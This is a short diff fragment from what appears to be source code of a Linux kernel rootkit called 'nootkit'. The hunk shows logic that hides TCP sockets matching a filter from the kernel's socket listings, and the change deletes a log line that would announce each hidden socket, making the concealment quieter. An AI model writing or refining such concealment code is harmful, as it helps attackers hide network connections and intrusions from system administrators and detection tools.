@@ -60,7 +60,6 @@ out:
             || (!filter_transport(filter, __cpu_to_be16(sock->sk_num), sock->sk_dport)))
                 continue;
             
-            printk(KERN_INFO "nootkit: Hiding TCP socket because of filter [%s]!", hide_sockets_strs[i]);
             return seq->op->next(seq, rc, pos);
         }
     }
